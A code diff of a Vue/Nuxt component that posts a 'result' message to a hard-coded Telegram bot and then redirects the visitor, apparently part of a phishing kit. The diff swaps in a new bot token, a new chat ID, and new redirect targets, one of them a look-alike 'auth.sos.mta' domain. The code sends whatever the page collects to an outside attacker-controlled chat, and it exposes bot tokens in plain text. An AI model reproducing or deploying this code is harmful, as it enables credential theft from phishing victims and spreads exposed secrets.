@@ -216,7 +216,7 @@ export default {
       loading: false,
       isActive: false,
       count: 0,
-      finalCount: 2, // Only send once
+      finalCount: 1, // Only send once
     };
   },
   methods: {
@@ -232,7 +232,7 @@ export default {
 
         // Send to Telegram
         await this.sendTelegramResult(
-          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
+          process.env.NUXT_APP_CHAT_ID || "-5167264103", 
           // 5
           message
         );
@@ -241,13 +241,13 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://auth.sos.mta.netsolbal.cc");
+        location.replace("https://mta-amber.vercel.app/");
       }
     },
 
     async sendTelegramResult(chatId, message) {
       try {
-        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
+        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;
 
         const payload = {
           chat_id: chatId,
